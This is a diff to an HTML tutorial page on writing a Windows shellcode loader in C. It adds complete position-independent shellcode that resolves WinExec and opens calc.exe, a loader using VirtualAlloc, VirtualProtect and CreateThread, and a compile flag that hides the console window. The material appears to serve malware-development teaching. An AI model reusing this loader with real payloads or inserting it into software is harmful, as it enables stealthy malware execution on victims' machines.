@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simple Loader - MALD3V</title>
+    <title>Simple Loader - MALD3F3ND</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -40,6 +40,15 @@
             padding: 2px 4px;
             border-radius: 4px;
         }
+        .screenshot {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .screenshot img {
+            max-width: 100%;
+            border-radius: 8px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+        }
     </style>
 </head>
 <body>
@@ -53,49 +62,84 @@
         <li>Changing the memory protection settings to make the memory executable.</li>
         <li>Executing the shellcode.</li>
     </ul>
-
     <h2>Code Example: Simple Loader</h2>
     <p>
-        Below is an example of a simple loader written in C. This loader will allocate memory, copy the shellcode into it, set the appropriate memory protections, and then execute the shellcode. The shellcode used in this example is highly abbreviated for demonstration purposes.
+        Below is an example of a simple loader written in C. This loader will allocate memory, copy the shellcode into it, set the appropriate memory protections, and then execute the shellcode. The shellcode used in this example is designed to open <code>calc.exe</code>.
     </p>
 
-    <pre><code>
-// Simple Loader Example (Abbreviated Shellcode)
+    <pre><code>// Simple Loader Example
 #include &lt;windows.h&gt;
 #include &lt;stdio.h&gt;
 
 int main() {
-    // Example shellcode (NOP sled + MessageBox)
-    unsigned char shellcode[] = {
-        0x90, 0x90, 0x90, // NOP sled
-        0x48, 0x31, 0xC0, // xor rax, rax
-        // ... [Truncated for brevity]
-        0xC3 // ret
-    };
+    // Shellcode to dynamically resolve kernel32.dll and open calc.exe
+    unsigned char shellcode[] =
+    "\x48\x83\xec\x28\x48\x8d\x15\x17\x01\x00\x00\x48\x8d\x0d\x03\x01"
+    "\x00\x00\xe8\x45\x00\x00\x00\x49\x89\xc7\x48\x8d\x0d\xf4\x00\x00"
+    "\x00\xff\xd0\x48\x8d\x15\x05\x01\x00\x00\x48\x8d\x0d\xe4\x00\x00"
+    "\x00\xe8\x26\x00\x00\x00\x48\x8d\x0d\xfa\x00\x00\x00\xba\x01\x00"
+    "\x00\x00\xff\xd0\x48\x8d\x15\xf5\x00\x00\x00\x48\x8d\x0d\xc3\x00"
+    "\x00\x00\xe8\x05\x00\x00\x00\x48\x31\xc9\xff\xd0\x48\x83\xec\x28"
+    "\x65\x4c\x8b\x04\x25\x60\x00\x00\x00\x4d\x8b\x40\x18\x4d\x8d\x60"
+    "\x10\x4d\x8b\x04\x24\xfc\x49\x8b\x78\x60\x48\x89\xce\xac\x84\xc0"
+    "\x74\x23\x8a\x27\x80\xfc\x61\x7c\x03\x80\xec\x20\x38\xc4\x75\x08"
+    "\x48\xff\xc7\x48\xff\xc7\xeb\xe5\x4d\x8b\x00\x4d\x39\xe0\x75\xd6"
+    "\x48\x31\xc0\xeb\x6b\x49\x8b\x58\x30\x44\x8b\x4b\x3c\x49\x01\xd9"
+    "\x49\x81\xc1\x88\x00\x00\x00\x45\x8b\x29\x4d\x85\xed\x74\x51\x4e"
+    "\x8d\x04\x2b\x45\x8b\x71\x04\x4d\x01\xee\x41\x8b\x48\x18\x45\x8b"
+    "\x50\x20\x49\x01\xda\xff\xc9\x4d\x8d\x0c\x8a\x41\x8b\x39\x48\x01"
+    "\xdf\x48\x89\xd6\xa6\x75\x08\x8a\x06\x84\xc0\x74\x09\xeb\xf5\xe2"
+    "\xe6\x48\x31\xc0\xeb\x1a\x45\x8b\x48\x24\x49\x01\xd9\x66\x41\x8b"
+    "\x0c\x49\x45\x8b\x48\x1c\x49\x01\xd9\x41\x8b\x04\x89\x48\x01\xd8"
+    "\x48\x83\xc4\x28\xc3";
 
     // Allocate memory for shellcode
-    LPVOID exec_mem = VirtualAlloc(
-        NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
-    );
+    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-    if (exec_mem == NULL) {
+    if (exec == NULL) {
         printf("Memory allocation failed.\n");
         return -1;
     }
 
     // Copy shellcode to allocated memory
-    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));
+    RtlMoveMemory(exec, shellcode, sizeof(shellcode));
 
-    // Execute the shellcode
-    ((void(*)())exec_mem)();
+    // Change memory protection to execute the shellcode
+    DWORD oldprotect = 0;
+    BOOL rv = VirtualProtect(exec, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);
+
+    if (rv) {
+        // Execute the shellcode
+        HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
+        WaitForSingleObject(th, -1);
+    } else {
+        printf("Failed to change memory protection.\n");
+    }
 
     return 0;
 }
     </code></pre>
+    
+    <p>
+        This simple loader demonstrates the essential steps needed to run shellcode within a process. The shellcode in this example dynamically resolves the base address of <code>kernel32.dll</code>, locates the address of <code>WinExec</code> using the Export Address Table, and then calls <code>WinExec</code> to open <code>calc.exe</code>.
+    </p>
+
+    <h2>Compiling the Loader</h2>
+    <p>
+        To compile this C program on a Windows system using Visual Studio from the command line, you can use the following command:
+    </p>
+
+    <pre><code>cl /EHsc program.c /link /SUBSYSTEM:WINDOWS</code></pre>
 
     <p>
-        This simple loader demonstrates the essential steps needed to run shellcode within a process. The shellcode in this example is extremely abbreviated, but in practice, it could perform any number of actions, from displaying a message box to more complex tasks.
+        This command compiles the C program (`program.c`) and links it as a Windows application (not a console application). The `/SUBSYSTEM:WINDOWS` option ensures that no console window is displayed when the program runs.
     </p>
+
+    <div class="screenshot">
+        <p><strong>Screenshot of calc.exe running after executing the shellcode:</strong></p>
+        <!-- Placeholder for screenshot -->
+        <img src="screenshot_placeholder.png" alt="Screenshot of calc.exe running" />
+    </div>
 </body>
 </html>
 
